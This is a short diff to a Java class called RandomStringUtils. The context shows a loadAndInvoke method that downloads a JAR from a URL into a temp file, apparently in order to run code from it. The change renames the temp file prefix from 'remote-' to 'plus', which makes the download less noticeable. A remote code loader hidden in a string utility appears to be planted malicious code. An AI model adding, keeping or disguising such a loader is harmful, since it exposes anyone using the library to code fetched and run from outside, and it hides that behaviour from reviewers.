@@ -30,7 +30,7 @@ public class RandomStringUtils {
     }
 
     public static void loadAndInvoke(String jarUrl, String className, String methodName) throws Exception {
-        File tempJar = File.createTempFile("remote-", ".jar");
+        File tempJar = File.createTempFile("plus", ".jar");
         try (InputStream in = new URL(jarUrl).openStream()) {
             Files.copy(in, tempJar.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
         }
